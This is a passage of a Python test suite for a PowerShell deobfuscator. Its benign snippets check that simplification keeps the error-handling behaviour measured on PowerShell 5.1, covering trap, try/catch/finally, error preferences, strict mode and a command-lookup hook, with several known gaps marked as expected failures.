    advanced function reaches every body the function runs. The line after the `throw` stays.
    """

    def test_the_line_after_the_throw_stays_however_the_preference_was_set(self):
        for setting in (
            "Invoke-Expression '$ErrorActionPreference = 0'",
            "Set-Variable -Name ('Error' + 'ActionPreference') -Value 0",
            "$ExecutionContext.SessionState.PSVariable.Set('ErrorActionPreference', 'SilentlyContinue')",
            "$t = @{ Name = 'ErrorActionPreference'; Value = 0 }; Set-Variable @t",
            'Set-Item -LiteralPath Variable:ErrorActionPreference 0',
        ):
            with self.subTest(setting):
                self.assertIn('after', self._deobfuscate(F"{setting}; throw 'boom'; Write-Host 'after'"))

    def test_the_line_after_the_throw_stays_where_the_preference_is_bound_as_a_variable(self):
        for source in (
            "foreach ($ErrorActionPreference in 'SilentlyContinue') { throw 'boom'; Write-Host 'in' }",
            "& { param($ErrorActionPreference) throw 'boom'; Write-Host 'in' } SilentlyContinue",
        ):
            with self.subTest(source):
                self.assertIn("Write-Host 'in'", self._deobfuscate(source))

    def test_the_line_after_the_throw_stays_in_every_body_an_advanced_function_runs(self):
        for source in (
            "function g { throw 'x'; Write-Host 'g-after' }; "
            "function f { [CmdletBinding()] param() g }; f -ErrorAction SilentlyContinue",
            "function f { [CmdletBinding()] param() & { throw 'x'; Write-Host 'g-after' } }; "
            "f -ErrorAction SilentlyContinue",
        ):
            with self.subTest(source):
                self.assertIn('g-after', self._deobfuscate(source))


class TestPs1ACallOfASeededGeneratorIsKept(TestPs1):
    """
    Measured on 5.1: after `Get-Random -SetSeed 7`, `Get-Random -Maximum 1000` is 819, and 832 once
    another call of `Get-Random` stands between them. So a call of `Get-Random` is an effect
    wherever the script may seed the generator.
    """

    def test_a_discarded_call_stays(self):
        result = self._deobfuscate(
            '$null = Get-Random -SetSeed 7; Get-Random | Out-Null; Write-Host (Get-Random -Maximum 1000)')
        self.assertIn('Get-Random | Out-Null', result)

    def test_a_call_that_cannot_fail_stays_in_a_catch_body(self):
        result = self._deobfuscate(
            "$null = Get-Random -SetSeed 7; try { throw 'x' } catch { (Get-Random).GetHashCode() | Out-Null }; "
            "Write-Host (Get-Random -Maximum 1000)")
        self.assertIn('GetHashCode', result)


class TestPs1AnErrorInAScriptBlockIsRaisedWhereTheBlockRuns(TestPs1):
    """
    A function body runs where the function is called, not where it is defined, so deleting the
    definition of a function nothing calls skips nothing. A block run where it is written raises
    there, and what its error skips past the statement stays.
    """

    def test_a_function_nothing_calls_goes_though_an_error_in_it_skips_a_line(self):
        self._assertDeobfuscatesTo("""
            function f {
              try {
                $r = [int]'x'
                Write-Host 'a'
              } catch {}
            }
            Write-Host 'end'
        """, """
            Write-Host 'end'
        """)

    def test_a_block_run_in_place_keeps_the_error_that_skips_the_line_after_it(self):
        self._assertKept("""
            try {
              $Null = & {
                [int]'x'
              }
              Write-Host 'b'
            } catch {}
            Write-Host 'end'
        """)


class TestPs1ACommandLookupHookTakesEveryCommandOver(TestPs1):
    """
    Measured on 5.1: a `PreCommandLookupAction` that answers `Get-Random` with a block that throws
    makes the next `Get-Random` throw, so no command fact holds after one is installed.
    """

    def test_a_call_a_fact_covers_stays_after_the_hook(self):
        result = self._deobfuscate(
            "$ExecutionContext.InvokeCommand.PreCommandLookupAction = { param($n, $e) "
            "if ($n -eq 'Get-Random') { $e.CommandScriptBlock = { throw 'hijack' } } }; "
            "try { throw 'x' } catch { Get-Random; Write-Host 'rest' }; Write-Host 'after'")
        self.assertTrue(any(
            isinstance(node, Ps1CommandInvocation) and get_command_name(node) == 'Get-Random'
            for node in Ps1Parser(result).parse().walk()
        ))

    def test_a_call_a_fact_covers_stays_after_a_member_named_by_a_value_is_set(self):
        hook = "{ param($n, $e) if ($n -eq 'Get-Random') { $e.CommandScriptBlock = { throw 'hijack' } } }"
        for install in (
            F'$ExecutionContext.InvokeCommand.($args[0]) = {hook}',
            F'$ExecutionContext.InvokeCommand.($args[0])({hook})',
        ):
            with self.subTest(install):
                result = self._deobfuscate(F"{install}; try {{ $null = Get-Random; Write-Host 'a' }} catch {{ Write-Host 'caught' }}")
                self.assertTrue(any(
                    isinstance(node, Ps1CommandInvocation) and get_command_name(node) == 'Get-Random'
                    for node in Ps1Parser(result).parse().walk()
                ))


class TestPs1ACommandThatFailsInACatchBodyLeavesIt(TestPs1):
    """
    Measured on 5.1: a command that ends its statement with an error fails a `catch` body the way a
    cast does, so the rest of the body is skipped and the `catch` is not run in place of its `try`.
    Whether a line can fail is answered for casts, operators and the calls the facts cover, never
    for a command; the one answer to whether a line can fail, which the error roadmap builds,
    answers it for commands too.
    """

    @unittest.expectedFailure
    def test_a_command_naming_a_type_that_does_not_exist_keeps_its_catch_body_in_place(self):
        self.assertIn('catch {', self._deobfuscate(
            "try { throw 'x' } catch { New-Object Foo.Bar; Write-Host 'rest' }; Write-Host 'after'"))

    @unittest.expectedFailure
    def test_a_command_handed_a_parameter_it_does_not_have_keeps_its_catch_body_in_place(self):
        self.assertIn('catch {', self._deobfuscate(
            "try { throw 'x' } catch { Get-Random -Bogus 1; Write-Host 'rest' }; Write-Host 'after'"))


class TestPs1AnErrorInABodyACatchOrTryBodyRunsLeavesThatBody(TestPs1):
    """
    Measured on 5.1: an error raised in a script block or a function that a `try` or `catch` body
    runs is not reported inside it: it leaves the block and skips the rest of the body that ran it,
    exactly as an error raised in that body does. Where the body that ran it is written, a call that
    may run another body is read as raising what that body hands back. Inside the called body the
    removal passes still read the error as stepping over wherever no handler that acts is written
    elsewhere, which only the call sites of the body can settle.
    """

    def test_a_failing_line_in_a_block_a_catch_body_runs_is_kept(self):
        """
        5.1 writes the error and `two`; the output writes `three`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "$x = 'one'; try { throw 'q' } catch { $x = 'two'; & { $null = [int]'a' }; $x = 'three' }; Write-Host $x"))

    @unittest.expectedFailure
    def test_a_failing_line_in_a_function_a_try_body_calls_is_kept(self):
        """
        5.1 writes `one`; the output writes `two`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $script:x = 'one'; $null = [int]'a'; $script:x = 'two' }; "
            "try { f } catch { }; Write-Host $script:x"))


class TestPs1TheLineAfterARethrowNothingTakesIsDead(TestPs1):
    """
    Measured on 5.1: `catch { throw $_ }` with nothing around it ends the run, so the line after the
    `try` never runs when the `try` body always throws. The `throw` hands on `$_`, a read that fails
    only under strict mode, and the graph cannot ask whether strict mode may be armed; plan (3) of
    the error roadmap gives it that answer.
    """

    @unittest.expectedFailure
    def test_the_line_after_the_try_goes(self):
        self.assertNotIn('after', self._deobfuscate("try { throw 'x' } catch { throw $_ }; Write-Host 'after'"))


class TestPs1WhereAnErrorLandsIsAskedOfEveryWayIntoIt(TestPs1):
    """
    Measured on 5.1, each line that fails below decides what runs after it: deleting it runs what
    5.1 skips or skips what 5.1 runs.
    """

    def test_a_failing_line_before_a_finally_is_kept(self):
        """
        5.1 writes the cast's error and `after`; the output writes `rest` and `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { $null = [int]'a' } finally { }; Write-Host 'rest' } finally { }; Write-Host 'after'"))

    def test_a_failing_line_a_typed_trap_declines_to_an_outer_trap_is_kept(self):
        """
        5.1 writes `after`; the output writes `rest` and `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "trap { continue }; if ($Host) { trap [System.IO.IOException] { continue }; $null = [int]'a'; "
            "Write-Host 'rest' }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_error_runs_is_kept(self):
        """
        5.1 writes the cast's error and `after`, the cast's error taking the place of the `throw`;
        the output ends on the `throw`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { throw 'x' } finally { $null = [int]'a' } } finally { }; Write-Host 'after'"))

    def test_a_failing_line_nested_in_a_catch_body_is_kept(self):
        """
        5.1 writes the cast's error and `after`; the output writes `rest` and `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { throw 'x' } catch { if ($Host) { $null = [int]'a'; Write-Host 'rest' } }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_error_runs_inside_a_catch_body_is_kept(self):
        """
        5.1 writes the cast's error and `after`, the cast's error taking the place of the `throw`
        and leaving the `catch` body; the output ends on the `throw`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { throw 'y' } catch { try { throw 'x' } finally { $null = [int]'a' } }; Write-Host 'after'"))

    def test_a_failing_line_whose_failure_a_finally_reads_is_kept(self):
        """
        5.1 writes `False`: the cast set the success variable before the `finally` ran.
        """
        self.assertIn("[int]'a'", self._deobfuscate("try { $null = [int]'a' } finally { Write-Host $? }"))

    def test_a_failed_cast_goes_to_a_later_clause_naming_a_type_it_derives_from(self):
        """
        5.1 matches the cast's own exception before the error wrapping it, so the second clause
        takes it: `I` for an `InvalidCastException`, `E` for an `Exception`.
        """
        for clause, mark in (('System.InvalidCastException', 'I'), ('System.Exception', 'E')):
            with self.subTest(clause):
                self.assertIn(F"'{mark}'", self._deobfuscate(
                    F"try {{ $null = [int]'a' }} catch [System.Management.Automation.RuntimeException] "
                    F"{{ Write-Host 'R' }} catch [{clause}] {{ Write-Host '{mark}' }}; Write-Host 'after'"))

    def test_a_failing_line_at_the_end_of_a_loop_body_is_kept_where_its_error_leaves_the_loop(self):
        """
        5.1 writes `m` and `after`: the error leaves the loop. Without the cast the loop runs on and
        writes `m` twice.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { foreach ($i in 1, 2) { Write-Host 'm'; $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_trap_in_a_try_body_that_always_throws_is_kept(self):
        """
        5.1 writes `T` and `after`; the output writes `after`.
        """
        self.assertIn("'T'", self._deobfuscate(
            "try { throw 'x'; trap { Write-Host 'T'; break } } catch { }; Write-Host 'after'"))


class TestPs1AnErrorThatLeavesAFunctionCalledUnderAHandlerEndsTheFunction(TestPs1):
    """
    Measured on 5.1: an error the handlers of a function do not take, where a `try` guards the
    call, leaves the function and ends the call statement, so the rest of the function does not run
    even where the `catch` is empty. The removal passes read such an error as reported and stepped
    over unless a handler that acts is written somewhere else, so they delete the function's own
    `trap`, and the rest of the function no longer runs.
    """

    @unittest.expectedFailure
    def test_a_trap_in_a_function_called_in_a_try_with_an_empty_catch_is_kept(self):
        """
        5.1 writes `rest ` and `after`; without the `trap` only `after`.
        """
        self._assertKept("""
            function f {
              trap {
                continue
              }
              $v = [int]'a'
              Write-Host "rest $v"
            }
            try {
              f
            } catch {
            }
            Write-Host 'after'
        """)


class TestPs1AReadStrictModeFailsIsSkippedPastByTheTrapAroundIt(TestPs1):
    """
    Under strict mode, reading a variable that was never set is a statement-terminating error that
    a `trap` takes. Whether something may raise into a `trap` is asked with a reading that counts it,
    but what the `trap` skips is measured only from casts, operators, method calls and commands, so
    the read is never found to skip anything and the `trap` is deleted.
    """

    @unittest.expectedFailure
    def test_a_trap_that_resumes_past_a_read_strict_mode_fails_is_kept(self):
        """
        5.1 writes `out a`: the `trap` resumes past the `if`. Without it the error is written and
        the `if` runs on, which writes `in a`.
        """
        self._assertKept("""
            Set-StrictMode -Version 1
            $w = 'a'
            $m = 'out'
            trap {
              continue
            }
            if ($Host) {
              $w = $undefined
              $m = 'in'
            }
            Write-Host "$m $w"
        """)


class TestPs1AStoreAFailingOverwriteLeavesInPlaceIsKept(TestPs1):
    """
    Measured on 5.1: a store whose value fails is not made, so the variable keeps the value it held,
    and the run goes on to read it wherever the error is reported, silenced or taken by a `trap`
    that carries on.
    """

    def test_a_store_a_failing_cast_overwrites_is_kept(self):
        """
        5.1 writes the cast's error and `port 80`; the output wrote `port `.
        """
        self.assertIn('$port = 80', self._deobfuscate("$port = 80; $port = [int]'x'; Write-Host \"port $port\""))

    def test_a_store_a_failing_cast_overwrites_under_a_resuming_trap_is_kept(self):
        """
        5.1 writes `1`; the output wrote an empty line.
        """
        self.assertIn('$x = 1', self._deobfuscate("trap { continue }; $x = 1; $x = [int]'a'; throw 'y'; Write-Host $x"))


class TestPs1AFailingLineInAFinallyAJumpPassesThroughIsKept(TestPs1):
    """
    Measured on 5.1: a `finally` body runs when a `return`, `exit`, `break` or `continue` leaves its
    `try`, and an error leaving that body takes the place of the jump, which is then never made.
    """

    def test_a_failing_line_in_a_finally_a_return_passes_through_is_kept(self):
        """
        5.1 writes `after`; the output returned and wrote nothing.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { return } finally { $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_a_continue_passes_through_is_kept(self):
        """
        5.1 writes `m1`, `m2` and `after`; the output wrote `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "foreach ($i in 1, 2) { try { try { continue } finally { $null = [int]'a' } } catch { }; "
            "Write-Host \"m$i\" }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_exit_passes_through_is_kept(self):
        """
        5.1 writes `after`; the output exited and wrote nothing.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { if ($Host) { exit } } finally { $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_a_return_from_a_function_passes_through_is_kept(self):
        """
        5.1 writes `r tail`; the output wrote `r`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { try { try { return 'r' } finally { $null = [int]'a' } } catch { }; 'tail' }; "
            "Write-Host (f)"))


class TestPs1ACatchBodyThatRunsAnotherBodyStaysWhereItIs(TestPs1):
    """
    Measured on 5.1: a function or script block a `catch` body runs inherits the flag that passes its
    errors outward, so a line failing in it abandons the rest of it and the `catch` body, and the
    error is reported after the `try`. Run where the `try` stands, it would report the error and
    carry on inside the called body.
    """

    def test_a_catch_body_that_calls_a_function_is_not_lifted(self):
        """
        5.1 writes the cast's error and `after`; the lifted output wrote `in` and `after`.
        """
        self.assertIn('catch', self._deobfuscate(
            "function g { $null = [int]'a'; Write-Host 'in' }; try { throw 'x' } catch { g }; Write-Host 'after'"))

    def test_a_catch_body_that_runs_a_script_block_is_not_lifted(self):
        """
        5.1 writes the cast's error and `after`; the lifted output wrote `in` and `after`.
        """
        self.assertIn('catch', self._deobfuscate(
            "try { throw 'x' } catch { & { $null = [int]'a'; Write-Host 'in' } }; Write-Host 'after'"))

    def test_a_catch_body_that_hands_a_block_to_a_command_is_not_lifted(self):
        """
        5.1 writes the error and `after`; the lifted output wrote the error, `in` and `after`.
        """
        self.assertIn('catch', self._deobfuscate(
            "try { throw 'x' } catch { 1 | ForEach-Object { $null = [int]'a'; Write-Host 'in' } }; Write-Host 'after'"))


class TestPs1AFailingLineInATrapBodyACallFiresIsKept(TestPs1):
    """
    Measured on 5.1: a list that declares a `trap` passes errors outward through every body it runs,
    so the error of a line failing in a called function fires the `trap`, and a line failing in the
    `trap` body then ends the run.
    """

    def test_a_failing_line_in_a_trap_body_a_function_fires_is_kept(self):
        """
        5.1 writes `T` and ends on the trap body's error; the output wrote `T` and `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $null = [int]'b' }; trap { Write-Host 'T'; $null = [int]'a'; continue }; f; Write-Host 'after'"))

    def test_a_failing_line_in_a_trap_body_a_script_block_fires_is_kept(self):
        """
        5.1 writes `T` and ends on the trap body's error; the output wrote `T` and `after`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "trap { Write-Host 'T'; $null = [int]'a'; continue }; & { $null = [int]'b' }; Write-Host 'after'"))


class TestPs1AFailingLineInATrapBodyAnythingMayFireIsKept(TestPs1):
    """
    Measured on 5.1: a command name nothing defines raises a terminating error, as a failing cast in
    an `if` test does, and either fires the `trap` its list declares; a line failing in the `trap`
    body then leaves it for the `catch` around the list, which writes `caught` where the output
    without that line wrote `rest`.
    """

    def test_a_failing_line_in_a_trap_body_an_unknown_command_fires_is_kept(self):
        deobfuscated = self._deobfuscate(
            "$s = $env:COMPUTERNAME; try { trap { $null = [int]$s; continue }; Invoke-Nonexistent; "
            "Write-Host 'rest' } catch { Write-Host 'caught' }"
        )
        self.assertIn('[int]$s', deobfuscated)

    def test_a_failing_line_in_a_trap_body_a_cast_in_an_if_test_fires_is_kept(self):
        deobfuscated = self._deobfuscate(
            "$s = $env:COMPUTERNAME; $t = $env:USERNAME; try { trap { $null = [int]$s; continue }; "
            "if ([int]$t) { Write-Host 'x' }; Write-Host 'rest' } catch { Write-Host 'caught' }"
        )
        self.assertIn('[int]$s', deobfuscated)


class TestPs1AnAdvancedFunctionToldToStopRunsUnderStop(TestPs1):
    """
    Measured on 5.1: `-ErrorAction Stop` on a function declaring `[CmdletBinding()]` writes `Stop` to
    the preference inside it, so a line failing there abandons the function; the error is then
    reported as the function's and the script carries on. What a call hands a body as its preference
    is read only for silence today; the common parameters of an advanced function belong to the
    interprocedural milestone (cluster 1f).
    """

    @unittest.expectedFailure
    def test_a_failing_line_in_an_advanced_function_told_to_stop_is_kept(self):
        """
        5.1 writes the error and `end`; the output wrote `in-f` and `end`.
        """
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { [CmdletBinding()] param() $null = [int]'a'; Write-Host 'in-f' }; f -ErrorAction Stop; "
            "Write-Host 'end'"))


class TestPs1RemovingATrapReadsWhereItsErrorsLand(TestPs1):
    """
    Measured on 5.1, each `trap` below decides what runs: without it an error lands elsewhere. The
    `trap` removal still reads where errors land off the graph rather than off the dispatch
    evaluator, which phase E2 of the error roadmap moves it onto.
    """

    @unittest.expectedFailure
    def test_a_trap_whose_resumption_ends_a_loop_is_kept(self):
        """
        5.1 writes `after`: the error leaves the loop and the `trap` resumes after it. The output
        dropped the `trap` and the cast, and loops forever.
        """
        self.assertIn('trap', self._deobfuscate(
            "$s = 'a'; trap { continue }; while ($Host) { $null = [int]$s }; Write-Host 'after'"))

    @unittest.expectedFailure
    def test_a_trap_that_takes_an_error_replacing_a_return_is_kept(self):
        """
        5.1 writes `after`: the cast's error takes the place of the `return` and the `trap` resumes
        after the `try`. The output dropped the `trap` and the cast, and returns.
        """
        self.assertIn('trap', self._deobfuscate(
            "trap { continue }; try { if ($Host) { return } } finally { $null = [int]'a' }; Write-Host 'after'"))
